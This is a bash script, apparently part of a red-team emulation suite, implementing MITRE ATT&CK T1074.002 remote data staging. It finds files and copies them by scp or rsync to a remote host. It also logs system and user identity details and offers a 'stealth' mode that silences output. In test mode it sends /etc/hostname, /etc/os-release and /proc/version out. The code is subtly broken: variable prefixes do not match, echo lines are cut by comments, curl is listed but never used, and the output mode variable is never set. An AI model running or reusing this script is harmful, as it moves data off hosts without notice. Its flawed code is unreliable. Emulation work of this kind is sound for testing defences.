
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1074_002B_DEBUG_MODE="${T1074_002B_DEBUG_MODE:-false}"
    export T1074_002B_TIMEOUT="${T1074_002B_TIMEOUT:-300}"
    export T1074_002B_FALLBACK_MODE="${T1074_002B_FALLBACK_MODE:-real}"
    export T1074_002B_OUTPUT_FORMAT="${T1074_002B_OUTPUT_FORMAT:-json}"
    export T1074_002B_POLICY_CHECK="${T1074_002B_POLICY_CHECK:-true}"
    export T1074_002B_MAX_FILES="${T1074_002B_MAX_FILES:-200}"
    export T1074_002B_MAX_FILE_SIZE="${T1074_002B_MAX_FILE_SIZE:-1048576}"
    export T1074_002B_SCAN_DEPTH="${T1074_002B_SCAN_DEPTH:-3}"
    export T1074_002B_EXCLUDE_CACHE="${T1074_002B_EXCLUDE_CACHE:-true}"
    export T1074_002B_CAPTURE_DURATION="${T1074_002B_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1074.002b - Data Staged: Remote Staging Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Stage collected data to remote location ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
    
    # Check for remote transfer tools
    if ! command -v scp >/dev/null && ! command -v rsync >/dev/null && ! command -v curl >/dev/null; then
        [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Remote transfer tools (scp, rsync, or curl) required"; exit 1
    fi
}

# Environment variables loading
Load-EnvironmentVariables() {
    # Add local fallback mode
    export T1074_002B_LOCAL_MODE="${T1074_002B_LOCAL_MODE:-true}"
    if [[ "$T1074_002B_LOCAL_MODE" == "true" ]]; then
        [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO]" >&2 # Using local staging mode as fallback"
        export T1074_002B_REMOTE_HOST="localhost"
    fi
    export T1074_002B_OUTPUT_BASE="${T1074_002B_OUTPUT_BASE:-./mitre_results}"
    export T1074_002B_TIMEOUT="${TT1074_002B_TIMEOUT:-300}"
    export T1074_002B_OUTPUT_MODE="${TT1074_002B_OUTPUT_MODE:-simple}"
    export T1074_002B_SILENT_MODE="${TT1074_002B_SILENT_MODE:-false}"
    export T1074_002B_MAX_FILES="${T1074_002B_MAX_FILES:-500}"
    
    export T1074_002B_REMOTE_HOST="${T1074_002B_REMOTE_HOST:-}"
    export T1074_002B_REMOTE_PATH="${T1074_002B_REMOTE_PATH:-/tmp/staging}"
    export T1074_002B_TRANSFER_METHOD="${T1074_002B_TRANSFER_METHOD:-scp}"
    export T1074_002B_SOURCE_PATHS="${T1074_002B_SOURCE_PATHS:-./mitre_results}"
    export T1074_002B_MAX_TOTAL_SIZE="${T1074_002B_MAX_TOTAL_SIZE:-1073741824}"
    export T1074_002B_COMPRESS_BEFORE="${T1074_002B_COMPRESS_BEFORE:-false}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$T1074_002B_OUTPUT_BASE" ]] && { [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1074_002B_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1074_002B_OUTPUT_BASE")" ]] && { [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    [[ -z "$T1074_002B_REMOTE_HOST" ]] && { [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Remote host not specified"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1074_002B_OUTPUT_BASE/T1074_002b_remote_staging_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{staging_logs,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Remote file staging
Stage-RemoteFile() {
    local source_file="$1" remote_host="$2" remote_path="$3" collection_dir="$4"
    
    [[ ! -f "$source_file" || ! -r "$source_file" ]] && return 1
    
    local filename=$(basename "$source_file")
    local remote_file="$remote_path/$(date +%s)_$filename"
    local transfer_log="$collection_dir/staging_logs/transfer_$(date +%s).log"
    
    case "$T1074_002B_TRANSFER_METHOD" in
        "scp")
            if scp "$source_file" "$remote_host:$remote_file" >"$transfer_log" 2>&1; then
                local file_size=$(stat -c%s "$source_file" 2>/dev/null || echo 0)
                echo "$source_file:$file_size"
                [[ "$T1074_002B_SILENT_MODE" != "true" ]] && echo "  + Staged: $source_file to $remote_host ($file_size bytes)" >&2
                return 0
            fi
            ;;
        "rsync")
            if rsync -q "$source_file" "$remote_host:$remote_file" >"$transfer_log" 2>&1; then
                local file_size=$(stat -c%s "$source_file" 2>/dev/null || echo 0)
                echo "$source_file:$file_size"
                [[ "$T1074_002B_SILENT_MODE" != "true" ]] && echo "  + Staged: $source_file to $remote_host ($file_size bytes)" >&2
                return 0
            fi
            ;;
    esac
    return 1
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
    echo "Remote host: $T1074_002B_REMOTE_HOST" > "$collection_dir/metadata/remote_info.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    [[ "${TT1074_002B_SILENT_MODE}" != "true" && "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$1" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "REMOTE DATA STAGING "
    echo "Files: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1074.002b",
    "results": {
        "files_staged": $files_collected,
        "total_size_bytes": $total_size,
        "remote_host": "$T1074_002B_REMOTE_HOST",
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$T1074_002B_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Starting remote data staging..."
    
    # Adaptive timeout logic for testing
    local effective_max_files="$T1074_002B_MAX_FILES"
    local test_files=()
    
    if [[ "${TT1074_002B_TIMEOUT:-300}" -lt 30 ]]; then
        [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO]" >&2 # Test mode detected, using sample files" >&2
        # Test avec fichiers simples et accessibles
        test_files=("/etc/hostname" "/etc/os-release" "/proc/version")
        effective_max_files=3
    elif [[ "${TT1074_002B_TIMEOUT:-300}" -lt 120 ]]; then
        [[ "${TT1074_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO]" >&2 # Quick mode detected, limiting to 10 files" >&2
        effective_max_files=10
    fi
    
    # ATOMIC ACTION: Orchestration of auxiliary functions with timeout protection
    if [[ ${#test_files[@]} -gt 0 ]]; then
        # Mode test avec fichiers fixes
        for source_file in "${test_files[@]}"; do
            [[ ! -f "$source_file" || ! -r "$source_file" ]] && continue
            
            if result=$(Stage-RemoteFile "$source_file" "$T1074_002B_REMOTE_HOST" "$T1074_002B_REMOTE_PATH" "$collection_dir"); then
                IFS=':' read -r file_path file_size <<< "$result"
                collected_files+=("$file_path")
                total_size=$((total_size + file_size))
                ((file_count++))
                [[ $file_count -ge $effective_max_files ]] && break
            fi
        done
    else
        # Mode normal avec find
        IFS=',' read -ra source_paths <<< "$T1074_002B_SOURCE_PATHS"
        local start_time=$(date +%s)
        
        for source_path in "${source_paths[@]}"; do
            source_path=$(echo "$source_path" | xargs)
            [[ ! -d "$source_path" ]] && continue
            
            while IFS= read -r -d '' source_file; do
                # Check timeout during processing
                local current_time=$(date +%s)
                [[ $((current_time - start_time)) -ge $((T1074_002B_TIMEOUT - 5)) ]] && break 2
                
                if result=$(Stage-RemoteFile "$source_file" "$T1074_002B_REMOTE_HOST" "$T1074_002B_REMOTE_PATH" "$collection_dir"); then
                    IFS=':' read -r file_path file_size <<< "$result"
                    collected_files+=("$file_path")
                    total_size=$((total_size + file_size))
                    ((file_count++))
                    [[ $file_count -ge $effective_max_files ]] && break 2
                fi
            done < <(find "$source_path" -type f -print0 2>/dev/null)
        done
    fi
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected files staged"
    exit 0
}

# Execute
Main "$@"